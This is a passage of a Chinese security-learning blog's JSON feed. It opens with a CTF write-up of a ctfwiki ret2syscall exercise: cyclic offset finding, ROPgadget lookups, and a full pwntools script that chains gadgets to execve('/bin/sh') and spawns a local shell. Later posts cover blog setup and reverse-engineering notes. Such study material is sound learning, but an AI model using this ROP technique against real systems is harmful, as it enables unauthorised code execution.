ctfwiki 上的例子做一下</h4>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227152927.png\" alt=\"image.png\"></p>\n<p>NX 保护</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227152726.png\" alt=\"image.png\"></p>\n<p>gets 栈溢出先用 cyclic 获取偏移量</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227153509.png\" alt=\"image.png\"></p>\n<p>得偏移量 112</p>\n<p>应用程序调用系统调用的过程是：</p>\n<pre><code>把系统调用的编号存入 EAX；\n把函数参数存入其它通用寄存器；\n触发 0x80 号中断（int 0x80）。\n[sys_execve系统调用号是11也就是0xb]\n</code></pre>\n<p><strong>Syscall 的函数调用规范为</strong>： <code>execve(“/bin/sh”, 0,0)</code> ;</p>\n<p>所以，<strong>eax</strong> = 0xb | <strong>ebx</strong> = address of ‘/bin/sh’ | <strong>ecx</strong> = 0 | <strong>edx</strong> = 0</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227153810.png\" alt=\"image.png\"></p>\n<p>payload=b’a’*112+p32(pop_rax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)</p>\n<p>用 ROPgadget 获取一些命令片段的地址</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227154902.png\" alt=\"image.png\"></p>\n<p>先找 eax</p>\n<p><code>0x080bb196 : pop eax ; ret</code>  这个可以用</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227155404.png\" alt=\"image.png\"></p>\n<p><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></p>\n<p>可以用 3 个寄存器都有了</p>\n<p>再找’/bin/sh’字符串和 int 0x80</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227155727.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227155827.png\" alt=\"image.png\"></p>\n<p>都找到了 可以写 exp 了</p>\n<p><code>from pwn import * p=process(' ./rop') int_addr=0x8049421 bin_addr=0x80be408 pop_other_ret=0x806eb90 pop_eax_ret=0x80bb196 payload=b'a'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr) p.sendline(payload) p.interactive()</code></p>\n<p>运行一下 成功本地 get shell</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221227161008.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221211175742.gif\" alt=\"image.gif\"></p>\n",
            "tags": [
                "二进制"
            ]
        },
        {
            "id": "https://3cly.github.io/2022/12/15/%E5%8D%9A%E5%AE%A2%E7%AE%80%E4%BB%8B/",
            "url": "https://3cly.github.io/2022/12/15/%E5%8D%9A%E5%AE%A2%E7%AE%80%E4%BB%8B/",
            "title": "博客简介",
            "date_published": "2022-12-15T07:02:58.000Z",
            "content_html": "<p>Welcome to sky の blog! 想学安全的二进制萌新于 12 月 14 号建立此博客<br>\n QQ:987623364</p>\n<p>邮箱：987623364@qq.com</p>\n",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2022/12/15/%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/",
            "url": "https://3cly.github.io/2022/12/15/%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/",
            "title": "搭建过程",
            "date_published": "2022-12-15T07:02:58.000Z",
            "content_html": "<h1 id=\"使用-hexogithub-搭建个人免费博客\"><a class=\"markdownIt-Anchor\" href=\"#使用-hexogithub-搭建个人免费博客\">#</a> <strong>使用 Hexo+GitHub 搭建个人免费博客</strong></h1>\n<p>准备：环境搭建</p>\n<p>Hexo 基于 Node.js，搭建过程中还需要使用 git，因此先搭建本地操作环境，安装 Node.js 和 Git。</p>\n<ul>\n<li>Node.js：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzJTNBLy9ub2RlanMub3JnL3poLWNu\">https://nodejs.org/zh-cn</span></li>\n<li>Git：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzJTNBLy9naXQtc2NtLmNvbS9kb3dubG9hZHM=\">https://git-scm.com/downloads</span></li>\n</ul>\n<p>下载 Node.js 和 Git 程序并安装，一路点 “下一步” 按默认配置完成安装。<br>\n<img data-src=\"/images/11.png\" alt=\"Untitled\"></p>\n<p><img data-src=\"/images/22.png\" alt=\"Untitled\"></p>\n<p><img data-src=\"/images/33.png\" alt=\"Untitled\"></p>\n<p><img data-src=\"/images/444.png\" alt=\"Untitled\"></p>\n<p><img data-src=\"/images/555.png\" alt=\"Untitled\"></p>\n<p><img data-src=\"/images/66.png\" alt=\"Untitled\"></p>\n<p>finished.<br>\n<strong> 还没有绑定域名因为要 $</strong><br>\nQWQ<br>\n 常用指令<br>\n hexo clean<br>\nhexo g<br>\nhexo d<br>\n 博客内容待完善<br>\n更新<br>\n换了一个图标<br>\n<img data-src=\"https://pic.imgdb.cn/item/639b006eb1fccdcd369474d8.png\" alt=\"Untitled\"></p>\n",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2022/12/15/%E9%9A%8F%E7%AC%94/",
            "url": "https://3cly.github.io/2022/12/15/%E9%9A%8F%E7%AC%94/",
            "title": "以前的杂记",
            "date_published": "2022-12-14T16:17:12.000Z",
            "content_html": "<h1 id=\"original-entry-point-原始入口点\"><a class=\"markdownIt-Anchor\" href=\"#original-entry-point-原始入口点\">#</a> original entry point 原始入口点</h1>\n<p>常见脱壳知识：1.PUSHAD （压栈） 代表程序的入口点 <br>\n2.POPAD （出栈） 代表程序的出口点，与 PUSHAD 对应，一般找到这个 OEP 就在附近拉！ <br>\n3.OEP：程序的入口点，注意这点：软件加壳就是隐藏了 OEP（或者用了假的 OEP）， <br>\n只要我们找到程序真正的 OEP，就可以立刻脱壳。</p>\n<p>网上说的 esp 定律脱壳时都说到 “当 esp 变红时下访问断点” 却没说明为什么，其实 od 当寄存器变化时就会变红，也就是说实质是留意堆栈什么时候变化。</p>\n<p>而把壳当成一个 call，当调用壳这个 call 时会压栈，esp 变红。</p>\n<h1 id=\"c中数值的后缀\"><a class=\"markdownIt-Anchor\" href=\"#c中数值的后缀\">#</a> C++ 中数值的后缀</h1>\n<p>在 C++ 中，数字表达提供了一系列的后缀进行表示，如下：<br>\n u 或 U  表示数字是无符号整型数，如：123u，但并不说明是长整型还是短整型</p>\n<p>l 或 L  表示数字是长整型数，如：123l；而 123ul 就是无符号长整型数；而 34.4l 就是长双精度浮点数，等效于双精度浮点数</p>\n<p>i64 或 I64  表示数字是长长整型数，其是为 64 位操作系统定义的，长度比长整型数长。如：43i64</p>\n<p>f 或 F  表示数字是单精度浮点数，如：12.3f</p>\n<p>e 或 E  表示数字的次幂，如：34.4e-2 就是 0.344；0.2544e3f 表示一个单精度浮点数，值为 254.4</p>\n<p>当什么后缀都没写时，则根据有无小数点及位数来决定其具体类型，如：123 表示的是有符号整型数，而 12341434 则是有符号长整型数；而 34.43 表示双精度浮点数。</p>\n<h1 id=\"杂\"><a class=\"markdownIt-Anchor\" href=\"#杂\">#</a> 杂</h1>\n<p>IDA 中右击代码选择<em> Hide casts</em><br>\n，可以隐藏那些看着比较乱的指针</p>\n<p><em>rsp 是栈指针寄存器，64 位。指向栈顶。相当于 32 位汇编里的 esp,16 位的 sp</em></p>\n<p>如何理解栈？把瓶子倒过来</p>\n<h1 id=\"huibian\"><a class=\"markdownIt-Anchor\" href=\"#huibian\">#</a> huibian</h1>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215153253.png\" alt=\"Untitled\"></p>\n<p>xor eax,eax</p>\n<p>是异或运算，两数相反为 1；两数相同为 0。由于这两个数相同，异或后等于清 0</p>\n<p>由于它比 mov eax,0 效率高，所以一般用它！</p>\n<p>xor eax,eax 异或后寄存器清零</p>\n<p>函数执行完后，下面的指令是 add esp,8<br>\n 因为我们之前声明了两个变量，占用了 8 个字节，现在 add 函数调用完了，我们已经不需要了，所以将 esp+8</p>\n<p>汇编指令 retn 用来结束当前过程返回到上一调用过程</p>\n<p>当 retn 指令执行时是将 esp 指向地址的值弹出到 EIP 指令指针寄存器<br>\n<img data-src=\"https://pic.imgdb.cn/item/639ae551b1fccdcd3667e70c.png\" alt=\"Untitled\"></p>\n<h1 id=\"smc\"><a class=\"markdownIt-Anchor\" href=\"#smc\">#</a> SMC</h1>\n<p>SMC（Self-Modifying  Code）（自解码），可以在一段代码执行前对它进行修改。常常利用这个特性，把代码以加密的形式保存在可自行文件中，然后在程序执行的时候进行动态解析。这样我们在采用静态分析时，看到的都是加密的内容，从而阻断了静态调试的可能性。</p>\n",
            "tags": [
                "笔记"
            ]
        }
    ]
}